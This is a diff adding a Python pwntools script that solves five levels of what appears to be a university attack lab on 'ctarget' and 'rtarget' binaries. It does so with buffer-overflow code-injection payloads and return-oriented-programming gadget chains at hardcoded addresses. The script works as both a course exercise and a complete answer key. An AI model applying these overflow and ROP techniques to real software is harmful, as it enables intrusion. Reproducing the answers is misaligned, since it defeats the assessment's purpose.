@@ -1,0 +1,154 @@
+import os
+from typing import Callable
+
+import click
+from pwn import process, p64, gdb, asm
+
+from Crypto.Util.number import long_to_bytes
+
+DIRECTORY = './answers/'
+BUF_SIZE = 56
+COOKIE = int(open('cookie.txt', 'r').read(), 16)
+POPRDIRET = asm('pop rdi; ret', arch='amd64')
+
+def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5]
+
+def get_solution_func(level: int) -> Callable[[bool], None]:
+    match level:
+        case 1:
+            return solve_level_1
+        case 2:
+            return solve_level_2
+        case 3:
+            return solve_level_3
+        case 4:
+            return solve_level_4
+        case 5:
+            return solve_level_5
+        case _:
+            raise ValueError("Invalid level")
+        
+def print_solution(level: int, solution: bytes) -> None:
+    if not os.path.exists(DIRECTORY):
+        os.makedirs(DIRECTORY)
+    
+    path = os.path.join(DIRECTORY, f'level_{level}_solution')
+    with open(path, 'wb') as f:
+        f.write(solution)
+
+def solve_ctarget(solution: bytes, flag: bool, level: int) -> None:
+    if flag:
+        print_solution(level, solution)
+        return
+    
+    proc = process(['./ctarget', '-q'])
+    proc.sendline(solution)
+    
+    try:
+        messasge = proc.recvall()
+        print(messasge.decode(errors='ignore'))
+    except EOFError:
+        pass
+    finally:
+        proc.close()
+
+def solve_rtarget(solution: bytes, flag: bool, level: int) -> None:
+    if flag:
+        print_solution(level, solution)
+        return
+    
+    proc = process(['./rtarget', '-q'])
+    proc.sendline(solution)
+    
+    try:
+        messasge = proc.recvall()
+        print(messasge.decode(errors='ignore'))
+    except EOFError:
+        pass
+    finally:
+        proc.close()
+        
+def solve_level_1(flag: bool) -> None:
+    solution = (
+        b"a" * BUF_SIZE # padding
+        + p64(0x4017fc) # touch 1
+    )
+    solve_ctarget(solution, flag, 1)
+
+def solve_level_2(flag: bool) -> None:
+    solution = (
+        POPRDIRET
+        + b"a" * (BUF_SIZE - len(POPRDIRET)) # padding
+        + p64(0x5561e608) # pop rdi; ret
+        + p64(COOKIE) # cookie value
+        + p64(0x401828) # touch 2
+    )
+    solve_ctarget(solution, flag, 2)
+
+def solve_level_3(flag: bool) -> None:
+    payload = long_to_bytes(COOKIE).hex().encode() + b'\x00'
+    solution = (
+        payload
+        + POPRDIRET
+        + b"a" * (BUF_SIZE - len(payload) - len(POPRDIRET)) # padding
+        + p64(0x5561e608 + len(payload)) # pop rdi; ret
+        + p64(0x5561e608) # cookie hex value address
+        + p64(0x4018fc) # touch 3
+    )
+    solve_ctarget(solution, flag, 3)
+
+def solve_level_4(flag: bool) -> None:
+    solution = (
+        b"a" * BUF_SIZE # padding
+        + p64(0x4019a8) # pop rax; ret
+        + p64(COOKIE) # cookie value
+        + p64(0x401992) # mov rdi, rax; ret
+        + p64(0x401828) # touch 2
+    )
+    solve_rtarget(solution, flag, 4)
+
+def solve_level_5(flag: bool) -> None:
+    payload = long_to_bytes(COOKIE).hex().encode() + b'\x00'
+    solution = (
+        b"a" * BUF_SIZE # padding
+        + p64(0x401a70) # mov rax, rsp; ret
+        + p64(0x401992) # mov rdi, rax; ret
+        + p64(0x4019a8) # pop rax; ret
+        + p64(0x100) # offset to cookie
+        + p64(0x401a5d) # mov edx, eax; nop; ret
+        + p64(0x4019cd) # mov ecx, edx; and bl, bl; ret
+        + p64(0x401a49) # mov esi, ecx; or dl, dl; ret
+        + p64(0x4019c6) # lea rax, [rdi + rsi]; ret
+        + p64(0x401992) # mov rdi, rax; ret
+        + p64(0x4018fc) # touch 3
+        + b"a" * (0x100 - 0x40 - 8) # padding (offset - prev_stack_size - self)
+        + payload # cookie hex string
+    )
+    solve_rtarget(solution, flag, 5)
+
+@click.command()
+@click.option("--level", "-l", help="level to solve", type=int, default=-1)
+@click.option("--output", "-o", is_flag=True, help="print the solution instead of executing it", type=bool, default=False)
+@click.option("--all", "-a", is_flag=True, help="solve all levels", type=bool, default=False)
+def main(level: int, output: bool, all: bool) -> None:
+    if level == -1 and not all:
+        click.echo("Please specify a level using --level or use --all to solve all levels.")
+        return
+    
+    if all:
+        for lvl in range(1, 6):
+            click.echo(f"Solving level {lvl}...")
+            solve_func = get_solution_func(lvl)
+            solve_func(output)
+        
+        return
+
+    if not check_level(level):
+        click.echo(f"Invalid level: {level}")
+        return
+
+    solve_func = get_solution_func(level)
+    solve_func(output)
+
+if __name__ == "__main__":
+    main()
